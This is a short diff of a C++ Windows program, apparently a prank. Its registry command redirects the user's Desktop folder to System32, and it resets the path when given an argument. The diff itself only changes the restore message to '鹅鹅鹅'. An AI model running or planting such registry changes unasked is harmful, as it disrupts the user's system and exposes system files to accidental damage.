@@ -10,7 +10,7 @@ int main(int argc, char* argv[]) {
 	//LPCTSTR regpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders";
 	if (argc>1) {
 		system("reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -v Desktop -t REG_EXPAND_SZ -d \"%USERPROFILE%\\Desktop\" -f");
-		cout << "已恢复。";
+		cout << "鹅鹅鹅";
 	}
 	else {
 		system("reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -v Desktop -t REG_EXPAND_SZ -d \"%WINDIR%\\System32\" -f");
